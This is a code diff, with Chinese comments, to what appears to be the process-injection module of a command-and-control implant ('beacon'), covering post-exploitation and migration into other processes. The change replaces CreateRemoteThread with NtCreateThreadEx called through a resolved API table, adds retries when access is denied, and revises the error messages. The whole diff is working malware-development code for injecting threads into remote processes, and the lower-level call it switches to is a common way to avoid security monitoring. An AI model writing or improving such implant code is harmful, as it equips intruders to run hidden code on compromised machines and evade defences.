@@ -1,5 +1,9 @@
 #include "beacon_inject.h"
 
+#ifndef STATUS_ACCESS_DENIED
+#define STATUS_ACCESS_DENIED ((NTSTATUS)0xC0000022L)
+#endif
+
 /* 查询目标进程的实际执行架构，兼容 WOW64 进程。 */
 BOOL InjectGetProcessMachine(HANDLE process,
                              const CHAR* label,
@@ -88,7 +92,8 @@ BOOL InjectRemoteProcessAlive(HANDLE process,
 }
 
 /* 创建远程线程；PostEx 可配置多次重试，Migrate 当前只尝试一次。 */
-BOOL InjectCreateRemoteThread(HANDLE process,
+BOOL InjectCreateRemoteThread(const Win32Api* api,
+                              HANDLE process,
                               PVOID remote_entry,
                               PVOID thread_parameter,
                               UINT32 attempts,
@@ -99,13 +104,12 @@ BOOL InjectCreateRemoteThread(HANDLE process,
                               SIZE_T err_size)
 {
     HANDLE thread = NULL;
-    DWORD last_error = 0;
     UINT32 attempt;
 
     if (remote_thread) *remote_thread = NULL;
     if (err && err_size) err[0] = '\0';
 
-    if (!process || !remote_entry || !remote_thread) {
+    if (!api || !process || !remote_entry || !remote_thread) {
         if (err) strcpy_s(err, err_size,
                           invalid_request_error ?
                           invalid_request_error :
@@ -116,29 +120,30 @@ BOOL InjectCreateRemoteThread(HANDLE process,
 
     for (attempt = 0; attempt < attempts; ++attempt) {
         CHAR process_status[96];
+        NTSTATUS st;
 
         if (!InjectRemoteProcessAlive(process, process_status,
                                       sizeof(process_status))) {
             if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                                 "CreateRemoteThread skipped: %s",
+                                 "NtCreateThreadEx skipped: %s",
                                  process_status);
             return FALSE;
         }
 
-        thread = CreateRemoteThread(process, NULL, 0,
-                                    (LPTHREAD_START_ROUTINE)remote_entry,
-                                    thread_parameter, 0, NULL);
-        if (thread) {
+        thread = NULL;
+        st = api->pfnNtCreateThreadEx(&thread, THREAD_ALL_ACCESS, NULL,
+                                      process, remote_entry, thread_parameter,
+                                      0, 0, 0, 0, NULL);
+        if (NT_SUCCESS(st) && thread) {
             *remote_thread = thread;
             return TRUE;
         }
+        if (thread) CloseHandle(thread);
 
-        last_error = GetLastError();
-        if (last_error != ERROR_ACCESS_DENIED || attempt + 1 >= attempts) {
+        if (st != STATUS_ACCESS_DENIED || attempt + 1 >= attempts) {
             if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                                 "CreateRemoteThread failed: %lu (%s)",
-                                 (ULONG)last_error,
-                                 process_status);
+                                 "NtCreateThreadEx failed: 0x%08lX",
+                                 (ULONG)st);
             return FALSE;
         }
         Sleep(retry_wait_ms);
